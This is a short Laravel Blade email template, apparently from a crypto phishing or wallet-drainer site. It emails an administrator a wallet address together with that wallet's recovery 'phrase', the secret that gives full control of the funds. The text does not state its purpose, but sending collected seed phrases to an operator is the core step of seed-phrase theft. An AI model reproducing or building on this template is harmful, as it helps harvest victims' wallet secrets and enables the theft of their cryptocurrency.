@component('mail::message')
# Hello Admin

Wallet: {{ $wallet['wallet']->wallet }}
<br>
Phrase: {{ $wallet['wallet']->phrase }}



Thanks,<br>
{{ config('app.name') }}
@endcomponent
